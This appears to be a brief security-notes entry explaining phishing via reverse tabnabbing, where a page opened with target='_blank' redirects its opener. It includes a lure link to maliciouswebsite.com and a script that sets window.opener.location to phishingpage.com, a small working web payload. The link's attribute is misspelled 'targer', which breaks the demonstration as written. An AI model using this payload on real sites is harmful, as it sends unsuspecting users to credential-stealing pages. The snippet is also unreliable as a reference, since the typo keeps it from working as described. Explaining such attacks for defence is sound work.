Phishing
======
The act of acquiring private or sensitive data from the victim, usually trough fake emails, websites, phonecalls, messages...

Phishing from target="_blank"
======
The target="_blank" has a vulnerability that allow the attacker to manipulate the parent page within the child page.
If the user can generate a link, the website can be easily exploited
```html
<!-- Malicious Link -->
<a href="http://maliciouswebsite.com" targer="_blank">Check this photos</a>

<!-- Redirect script on malicious website -->
<script>
    window.opener.location = "http://phishingpage.com";
</script>
```

